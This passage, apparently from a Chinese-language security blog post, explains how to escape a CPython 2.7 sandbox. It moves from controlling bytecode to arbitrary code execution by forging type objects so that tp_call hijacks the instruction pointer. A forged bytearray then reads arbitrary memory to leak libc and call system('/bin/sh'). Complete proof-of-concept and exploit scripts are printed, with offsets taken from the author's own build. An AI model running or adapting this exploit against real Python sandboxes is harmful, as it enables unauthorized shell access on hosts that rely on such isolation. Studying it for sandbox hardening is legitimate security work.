$4&nbsp;=&nbsp;0xbeef</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">0xbeef就是我们输入的值，也就是说我们控制了GETITEM的参数。这里就说明了一个很大的问题：我们是可以控制运行的字节码的。最后segfault的原因嘛，这个值取不了，有问题，于是就segfault了。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">其实到这，针对Python沙箱的论述也差不多了，毕竟我们已经可以控制运行的字节码，但是毕竟我们最终的目的是拿到shell对吧，那么接下来怎么做？</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2.从运行任意字节码到任意代码执行</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1)基本思路</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">好了，我们可以执行任意字节码了，不过还不够。如何执行任意代码？我们需要一个函数指针，反正啥都可以改，我们改掉这个函数指针就可以了。我们也十分幸运，恰巧就有这么一个神奇的函数指针：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><a href="https://github.com/python/cpython/blob/5eb788bf7f54a8e04429e18fc332db858edd64b6/Objects/call.c" _src="https://github.com/python/cpython/blob/5eb788bf7f54a8e04429e18fc332db858edd64b6/Objects/call.c">https://github.com/python/cpython/blob/5eb788bf7f54a8e04429e18fc332db858edd64b6/Objects/call.c</a></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">PyObject&nbsp;*
PyObject_Call(PyObject&nbsp;*callable,&nbsp;PyObject&nbsp;*args,&nbsp;PyObject&nbsp;*kwargs)
{
ternaryfunc&nbsp;call;
PyObject&nbsp;*result;
/*&nbsp;PyObject_Call()&nbsp;must&nbsp;not&nbsp;be&nbsp;called&nbsp;with&nbsp;an&nbsp;exception&nbsp;
set,&nbsp;because&nbsp;it&nbsp;can&nbsp;clear&nbsp;it&nbsp;(directly&nbsp;or&nbsp;indirectly)&nbsp;
and&nbsp;so&nbsp;the&nbsp;caller&nbsp;loses&nbsp;its&nbsp;exception&nbsp;*/
assert(!PyErr_Occurred());
assert(PyTuple_Check(args));
assert(kwargs&nbsp;==&nbsp;NULL&nbsp;||&nbsp;PyDict_Check(kwargs));
&nbsp;&nbsp;
if&nbsp;(PyFunction_Check(callable))&nbsp;{
return&nbsp;_PyFunction_FastCallDict(callable,
&amp;PyTuple_GET_ITEM(args,&nbsp;0),
PyTuple_GET_SIZE(args),
kwargs);
}
else&nbsp;if&nbsp;(PyCFunction_Check(callable))&nbsp;{
return&nbsp;PyCFunction_Call(callable,&nbsp;args,&nbsp;kwargs);
}
else&nbsp;{
call&nbsp;=&nbsp;callable-&gt;ob_type-&gt;tp_call;
if&nbsp;(call&nbsp;==&nbsp;NULL)&nbsp;{
PyErr_Format(PyExc_TypeError,&nbsp;&quot;&#39;%.200s&#39;&nbsp;object&nbsp;is&nbsp;not&nbsp;callable&quot;,
callable-&gt;ob_type-&gt;tp_name);
return&nbsp;NULL;
}
if&nbsp;(Py_EnterRecursiveCall(&quot;&nbsp;while&nbsp;calling&nbsp;a&nbsp;Python&nbsp;object&quot;))
return&nbsp;NULL;
result&nbsp;=&nbsp;(*call)(callable,&nbsp;args,&nbsp;kwargs);&nbsp;/*&nbsp;快看！一个漂亮大方的函数指针！&nbsp;*/
Py_LeaveRecursiveCall();
return&nbsp;_Py_CheckFunctionResult(callable,&nbsp;result,&nbsp;NULL);
}
}</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">好了函数指针有了，现在总结一下调用到函数指针的整个流程：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">ceval.c：<a href="https://github.com/python/cpython/blob/2.7/Python/ceval.c" _src="https://github.com/python/cpython/blob/2.7/Python/ceval.c">https://github.com/python/cpython/blob/2.7/Python/ceval.c</a></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">TARGET(CALL_FUNCTION)
{
PyObject&nbsp;**sp;
PCALL(PCALL_ALL);
sp&nbsp;=&nbsp;stack_pointer;
x&nbsp;=&nbsp;call_function(&amp;sp,&nbsp;oparg);&nbsp;/*&nbsp;这里进call_function&nbsp;*/
static&nbsp;PyObject&nbsp;*
call_function(PyObject&nbsp;***pp_stack,&nbsp;int&nbsp;oparg)
{
int&nbsp;na&nbsp;=&nbsp;oparg&nbsp;&amp;&nbsp;0xff;
int&nbsp;nk&nbsp;=&nbsp;(oparg&gt;&gt;8)&nbsp;&amp;&nbsp;0xff;
int&nbsp;n&nbsp;=&nbsp;na&nbsp;+&nbsp;2&nbsp;*&nbsp;nk;
PyObject&nbsp;**pfunc&nbsp;=&nbsp;(*pp_stack)&nbsp;-&nbsp;n&nbsp;-&nbsp;1;
PyObject&nbsp;*func&nbsp;=&nbsp;*pfunc;
PyObject&nbsp;*x,&nbsp;*w;
if&nbsp;(PyCFunction_Check(func)&nbsp;&amp;&amp;&nbsp;nk&nbsp;==&nbsp;0)&nbsp;{
[...]
}&nbsp;else&nbsp;{
&nbsp;if&nbsp;(PyMethod_Check(func)&nbsp;&amp;&amp;&nbsp;PyMethod_GET_SELF(func)&nbsp;!=&nbsp;NULL)&nbsp;{
&nbsp;[...]
}&nbsp;else
Py_INCREF(func);
&nbsp;&nbsp;&nbsp;&nbsp;
if&nbsp;(PyFunction_Check(func))
&nbsp;//&nbsp;don&#39;t&nbsp;care
else
x&nbsp;=&nbsp;do_call(func,&nbsp;pp_stack,&nbsp;na,&nbsp;nk);&nbsp;/*&nbsp;这里进do_call&nbsp;*/
&nbsp;
}
&nbsp;&nbsp;&nbsp;&nbsp;[...]
}
static&nbsp;PyObject&nbsp;*
do_call(PyObject&nbsp;*func,&nbsp;PyObject&nbsp;***pp_stack,&nbsp;int&nbsp;na,&nbsp;int&nbsp;nk)
{
&nbsp;&nbsp;if&nbsp;(nk&nbsp;&gt;&nbsp;0)&nbsp;{
&nbsp;&nbsp;&nbsp;[...]
&nbsp;if&nbsp;(kwdict&nbsp;==&nbsp;NULL)
&nbsp;goto&nbsp;call_fail;
&nbsp;}
callargs&nbsp;=&nbsp;load_args(pp_stack,&nbsp;na);
if&nbsp;(callargs&nbsp;==&nbsp;NULL)
goto&nbsp;call_fail;
&nbsp;
&nbsp;if&nbsp;(PyCFunction_Check(func))&nbsp;{
&nbsp;[...]
&nbsp;}
&nbsp;else
result&nbsp;=&nbsp;PyObject_Call(func,&nbsp;callargs,&nbsp;kwdict);&nbsp;/*&nbsp;找到地方了&nbsp;*/
call_fail:
[...]
}</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">总结一下需要调用到函数指针的过程：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">i.字节码类型是CALL_FUNCTION，进入call_function；</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">ii.call_function中，PyCFunction_Check或者nk==0不成立，之后PyMethod_Check或者PyMethod_GET_SELF(func) != NULL不成立，然后PyFunction_Check不成立，进入do_call；</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">iii.do_call中PyCFunction_Check不成立，进入PyOBject_Call；</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">iv.PyObject_call中，func的ob_type的tp_call就是我们要调用的函数指针。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">看代码有点烦，通俗地讲：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">i.字节码是CALL_FUNCTION；</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">ii.不是function类型也不是method类型，不过是object类型；</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">iii.这个object类型的type object里的tp_call就是调用的函数指针。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这么看就简单多了，type object虽然是一开始静态分配的，但是反正又不检查，不是静态分配又如何？伪造一个嘛。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2)最终思路</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">i.构造一个object，构造为type object的形式，不过tp_call指向想要执行的位置；</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">ii.构造第二个object，使得type指向第一个object；</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">iii.构造第三个object，指针指向第二个object；</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">iv.构造字节码：1.通过extended_arg构造offset参数，offset为consts和第三个object的偏移，2.通过load_const指令，由于按照consts是tuple，会再解一次引用，于是使得第二个object被push进栈，3.通过call_function，进入调用过程；</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">v.将字节码设置进入某个function的func_code；</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">vi.执行这个function，即执行我们构造好的func_code。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3)poc.py</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">import&nbsp;types
from&nbsp;opcode&nbsp;import&nbsp;opmap
import&nbsp;struct
&nbsp;
&nbsp;
def&nbsp;p16(content):
return&nbsp;struct.pack(&quot;&lt;H&quot;,&nbsp;content)
def&nbsp;p32(content):
return&nbsp;struct.pack(&quot;&lt;I&quot;,&nbsp;content)
def&nbsp;p64(content):
return&nbsp;struct.pack(&quot;&lt;Q&quot;,&nbsp;content)
def&nbsp;somefunction():
pass
def&nbsp;get_opcode(opname):
return&nbsp;chr(opmap[opname])
consts&nbsp;=&nbsp;(&quot;12345&quot;,&nbsp;)
fake_type_object&nbsp;=&nbsp;&#39;a&#39;&nbsp;*&nbsp;(0x5610&nbsp;-&nbsp;0x55b4)&nbsp;+&nbsp;p64(0xdeadbeef)
ptr_fake_type&nbsp;=&nbsp;id(fake_type_object)
ptr&nbsp;=&nbsp;ptr_fake_type
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_ob_next&nbsp;_ob_prev&nbsp;ref&nbsp;cntt&nbsp;ob_type
fake_object=&nbsp;&#39;a&#39;&nbsp;*&nbsp;4&nbsp;+&nbsp;p64(ptr)&nbsp;+&nbsp;p64(ptr)&nbsp;+&nbsp;p64(1)&nbsp;+&nbsp;p64(ptr)
#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;points&nbsp;to
to_load&nbsp;=&nbsp;&#39;aaaa&#39;&nbsp;+&nbsp;p64(id(fake_object)&nbsp;+&nbsp;(0x310&nbsp;-&nbsp;0x2e0)&nbsp;+&nbsp;8)
ptr_fake_object&nbsp;=&nbsp;id(to_load)&nbsp;+&nbsp;(0x310&nbsp;-&nbsp;0x2e0)
ptr_consts&nbsp;=&nbsp;id(consts)&nbsp;+&nbsp;32
offset&nbsp;=&nbsp;((ptr_fake_object&nbsp;-&nbsp;ptr_consts)&nbsp;//&nbsp;8)&nbsp;&amp;&nbsp;0xffffffff
def&nbsp;get_code(code_byte_str,&nbsp;code_consts):
somefunction.func_code&nbsp;=&nbsp;types.CodeType(
0,&nbsp;0,&nbsp;0,&nbsp;0,
&nbsp;code_byte_str,
code_consts,&nbsp;(),&nbsp;(),
&quot;&quot;,&nbsp;&quot;&quot;,&nbsp;0,&nbsp;&quot;&quot;
)
return&nbsp;somefunction
extended_arg&nbsp;=&nbsp;get_opcode(&#39;EXTENDED_ARG&#39;)
load_const&nbsp;=&nbsp;get_opcode(&#39;LOAD_CONST&#39;)
call_function&nbsp;=&nbsp;get_opcode(&#39;CALL_FUNCTION&#39;)
load_fast&nbsp;=&nbsp;get_opcode(&#39;LOAD_FAST&#39;)
code&nbsp;=&nbsp;get_code(
extended_arg&nbsp;+\
p16(offset&nbsp;&gt;&gt;&nbsp;16)&nbsp;+\
load_const&nbsp;+\
p16(offset&nbsp;&amp;&nbsp;0xffff)&nbsp;+\
call_function&nbsp;+\
p16(0),
consts
)
#raw_input()
code()</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这个poc稍微显得有点乱，但是基本能够表达清楚思路。主要是有一些偏移量的计算不太好算，所以我采用了动态调试的方法，直接看内存结构，然后相减得到的偏移，看起来虽然乱了，但是却是计算偏移最简单的方法，偏移量其实很多时候不是很好静态计算，可能有一些你没想到的细节，如果动态去调着看的话，就一定是正确的偏移了。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">运行这个POC，我们可以使rip指向0xdeadbeef了。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3.从POC到EXP，任意执行到shell</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">其实到这，剩下的步骤虽然还有一些，但是思路上已经全部清晰了，我们可以执行任意代码，现在需要的是：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">i.找到system的地址；</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">ii.传入参数。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1)任意读</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">根据之前的讨论，我们知道了我们可以随意更改字节码，执行任意字节码，那么想要构造一个新的object也不是难事。想要读取信息，就需要一个指针，而Python有指针的地方实在是太多了。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们采取的方法是使用ByteArrayObject，ByteArrayObject代码如下：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">typedef&nbsp;struct&nbsp;{
PyObject_VAR_HEAD
&nbsp;/*&nbsp;XXX(nnorwitz):&nbsp;should&nbsp;ob_exports&nbsp;be&nbsp;Py_ssize_t?&nbsp;*/
&nbsp;int&nbsp;ob_exports;&nbsp;/*&nbsp;how&nbsp;many&nbsp;buffer&nbsp;exports&nbsp;*/
Py_ssize_t&nbsp;ob_alloc;&nbsp;/*&nbsp;How&nbsp;many&nbsp;bytes&nbsp;allocated&nbsp;*/
&nbsp;char&nbsp;*ob_bytes;&nbsp;/*&nbsp;重点！一个可以读的指针&nbsp;*/
}&nbsp;PyByteArrayObject;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">所以，想要任意读，伪造一个BYteArrayObject，伪造方法和之前一样，然后直接读就可以了，好了，现在的问题只剩下，读哪儿？</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2)system地址</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">想要找到system的地址，就需要libc地址，libc地址其实还花了我一些时间，不过最终用到一个方法：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">sys.stdin的f_fp字段存有_IO_2_1_stdin的地址，这个地址是位于libc data段的，可以利用这个去拿到libc地址，最终拿到system地址，读取方法就根据上一节的PyByteArrayObject的方法就可以。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3)参数</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">有了system，可以劫持rip，最后的问题是传入参数。这里就需要注意到之前call的调用方式了：</span></p><pre class="brush:bash;toolbar:false">result&nbsp;=&nbsp;(*call)(callable,&nbsp;args,&nbsp;kwargs);&nbsp;/*&nbsp;func是第一个参数&nbsp;*/</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">func是一个指针，指向我们构造的“第一个对象”，所以，我们只需要把第一个对象的开始部分设置为&quot;/bin/sh&quot;，由于ob_next并没有用到，所以改为字符串并不会影响其他结果，最后就可以system(&quot;/bin/sh&quot;)了。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">4.exp.py</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个exploit是我自己的环境下的，并且是自己编译的debug版本，执行不正常是可能出现的，因为偏移量不一样，甚至具体代码都有可能有一些不一样，所以仅供参考。最后还是需要自己手动调试才行（特别是各种偏移量）。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">import&nbsp;types
import&nbsp;sys
from&nbsp;opcode&nbsp;import&nbsp;opmap
import&nbsp;struct
def&nbsp;p16(content):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;struct.pack(&quot;&lt;H&quot;,&nbsp;content)
&nbsp;
&nbsp;&nbsp;def&nbsp;p32(content):
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;struct.pack(&quot;&lt;I&quot;,&nbsp;content)
def&nbsp;p64(content):
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;struct.pack(&quot;&lt;Q&quot;,&nbsp;content)
def&nbsp;u64(content):
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;struct.unpack(&quot;&lt;Q&quot;,&nbsp;content)
def&nbsp;get_opcode(opname):
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;chr(opmap[opname])
def&nbsp;get_code(somefunction,&nbsp;code_byte_str,&nbsp;code_consts):
&nbsp;&nbsp;&nbsp;&nbsp;somefunction.func_code&nbsp;=&nbsp;types.CodeType(
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0,&nbsp;0,&nbsp;0,&nbsp;0,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;code_byte_str,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;code_consts,&nbsp;(),&nbsp;(),
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;,&nbsp;&quot;&quot;,&nbsp;0,&nbsp;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;somefunction
extended_arg&nbsp;=&nbsp;get_opcode(&#39;EXTENDED_ARG&#39;)
load_const&nbsp;=&nbsp;get_opcode(&#39;LOAD_CONST&#39;)
call_function&nbsp;=&nbsp;get_opcode(&#39;CALL_FUNCTION&#39;)
load_fast&nbsp;=&nbsp;get_opcode(&#39;LOAD_FAST&#39;)
return_value&nbsp;=&nbsp;get_opcode(&#39;RETURN_VALUE&#39;)
def&nbsp;call(rip):
&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;make&nbsp;the&nbsp;python&nbsp;call&nbsp;addr
&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;consts&nbsp;=&nbsp;(&quot;12345&quot;,&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;fake_type_object&nbsp;=&nbsp;&#39;a&#39;&nbsp;*&nbsp;(0x5610&nbsp;-&nbsp;0x55b4)&nbsp;+&nbsp;p64(rip)
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;ptr_fake_type&nbsp;=&nbsp;id(fake_type_object)
&nbsp;&nbsp;&nbsp;&nbsp;ptr&nbsp;=&nbsp;ptr_fake_type
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_ob_next&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_ob_prev&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ref&nbsp;cnt&nbsp;ob_type
&nbsp;&nbsp;&nbsp;&nbsp;fake_object=&nbsp;&#39;a&#39;&nbsp;*&nbsp;4&nbsp;+&nbsp;&#39;/bin/sh;&#39;.ljust(8)&nbsp;+&nbsp;p64(ptr)&nbsp;+&nbsp;p64(1)&nbsp;+&nbsp;p64(ptr)
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;to_load&nbsp;=&nbsp;&#39;aaaa&#39;&nbsp;+&nbsp;p64(id(fake_object)&nbsp;+&nbsp;(0x310&nbsp;-&nbsp;0x2e0)&nbsp;+&nbsp;8)
&nbsp;&nbsp;&nbsp;&nbsp;ptr_fake_object&nbsp;=&nbsp;id(to_load)&nbsp;+&nbsp;(0x310&nbsp;-&nbsp;0x2e0)
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;ptr_consts&nbsp;=&nbsp;id(consts)&nbsp;+&nbsp;32
&nbsp;&nbsp;&nbsp;&nbsp;offset&nbsp;=&nbsp;((ptr_fake_object&nbsp;-&nbsp;ptr_consts)&nbsp;//&nbsp;8)&nbsp;&amp;&nbsp;0xffffffff
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;somefunction():
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pass
&nbsp;&nbsp;&nbsp;&nbsp;code&nbsp;=&nbsp;get_code(
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;somefunction,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;extended_arg&nbsp;+\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p16(offset&nbsp;&gt;&gt;&nbsp;16)&nbsp;+\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;load_const&nbsp;+\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p16(offset&nbsp;&amp;&nbsp;0xffff)&nbsp;+\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call_function&nbsp;+\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p16(0),
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;consts
&nbsp;&nbsp;&nbsp;&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;#raw_input()
&nbsp;&nbsp;&nbsp;&nbsp;code()
def&nbsp;pwn(addr):
&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;leak&nbsp;the&nbsp;content&nbsp;of&nbsp;the&nbsp;address&nbsp;and&nbsp;call&nbsp;system(&#39;/bin/sh;&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;&quot;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;consts&nbsp;=&nbsp;(12345,&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;to_be_next&nbsp;=&nbsp;bytearray(&quot;111&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;next_ptr&nbsp;=&nbsp;id(to_be_next)&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;bytearray_type_ptr&nbsp;=&nbsp;int(to_be_next.__subclasshook__.__str__().split(&#39;at&nbsp;&#39;)[1][:-1],&nbsp;16)
&nbsp;&nbsp;&nbsp;&nbsp;#print(&quot;byte&nbsp;array&nbsp;type:{}&quot;.format(hex(bytearray_type_ptr)))
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;_ob_next&nbsp;_ob_prev&nbsp;ref&nbsp;cnt&nbsp;ob_type
&nbsp;&nbsp;&nbsp;&nbsp;fake_bytearray&nbsp;=&nbsp;&#39;a&#39;&nbsp;*&nbsp;4&nbsp;+&nbsp;p64(next_ptr)&nbsp;+&nbsp;p64(next_ptr)&nbsp;+&nbsp;p64(1)&nbsp;+&nbsp;p64(bytearray_type_ptr)
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;size&nbsp;ob_exports&nbsp;junk&nbsp;ob_alloc&nbsp;ob_bytes
&nbsp;&nbsp;&nbsp;&nbsp;fake_bytearray&nbsp;+=&nbsp;p64(0x20)&nbsp;+&nbsp;p32(1)&nbsp;+&nbsp;&#39;aaaa&#39;&nbsp;+&nbsp;p64(20)&nbsp;+&nbsp;p64(addr)
&nbsp;&nbsp;&nbsp;&nbsp;to_load&nbsp;=&nbsp;&#39;aaaa&#39;&nbsp;+&nbsp;p64(id(fake_bytearray)&nbsp;+&nbsp;(0x310&nbsp;-&nbsp;0x2e0)&nbsp;+&nbsp;8)&nbsp;+&nbsp;p64(1)&nbsp;+&nbsp;p64(1)
&nbsp;&nbsp;&nbsp;&nbsp;ptr_fake_object&nbsp;=&nbsp;id(to_load)&nbsp;+&nbsp;(0x310&nbsp;-&nbsp;0x2e0)
&nbsp;&nbsp;&nbsp;&nbsp;#print(&quot;fake&nbsp;byte&nbsp;array:{}&quot;.format(hex(ptr_fake_object)))
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;ptr_consts&nbsp;=&nbsp;id(consts)&nbsp;+&nbsp;32
&nbsp;&nbsp;&nbsp;&nbsp;offset&nbsp;=&nbsp;((ptr_fake_object&nbsp;-&nbsp;ptr_consts)&nbsp;//&nbsp;8)&nbsp;&amp;&nbsp;0xffffffff
&nbsp;&nbsp;&nbsp;&nbsp;#print(&quot;ptr&nbsp;consts:{}&nbsp;offset:{}&quot;.format(hex(ptr_consts),&nbsp;hex(offset)))
&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;someleak():
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pass
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;get_fake_bytearray_function&nbsp;=&nbsp;get_code(
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;someleak,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;extended_arg&nbsp;+&nbsp;p16(offset&nbsp;&gt;&gt;&nbsp;16)&nbsp;+\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;load_const&nbsp;+&nbsp;p16(offset&nbsp;&amp;&nbsp;0xffff)&nbsp;+\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return_value,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;consts
&nbsp;&nbsp;&nbsp;&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;#raw_input()
&nbsp;&nbsp;&nbsp;&nbsp;fake_bytearray_object&nbsp;=&nbsp;get_fake_bytearray_function()
&nbsp;&nbsp;&nbsp;&nbsp;#print(&quot;fake&nbsp;byte&nbsp;array&nbsp;object:{}&quot;.format(hex(id(fake_bytearray_object))))
&nbsp;&nbsp;&nbsp;&nbsp;_IO_2_1_stdin_addr_list&nbsp;=&nbsp;[]
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(8):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_IO_2_1_stdin_addr_list.append(fake_bytearray_object[i])
&nbsp;&nbsp;&nbsp;&nbsp;_IO_2_1_stdin_addr&nbsp;=&nbsp;u64(&#39;&#39;.join(map(chr,&nbsp;_IO_2_1_stdin_addr_list)))[0]
&nbsp;&nbsp;&nbsp;&nbsp;#print(_IO_2_1_stdin_addr)
&nbsp;&nbsp;&nbsp;&nbsp;#print(&quot;addr:{}&quot;.format(hex(_IO_2_1_stdin_addr)))
&nbsp;&nbsp;&nbsp;&nbsp;libc_base&nbsp;=&nbsp;_IO_2_1_stdin_addr&nbsp;-&nbsp;0x39f8a0
&nbsp;&nbsp;&nbsp;&nbsp;system_addr&nbsp;=&nbsp;libc_base&nbsp;+&nbsp;0x40db0
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;call(system_addr)
&nbsp;&nbsp;&nbsp;&nbsp;
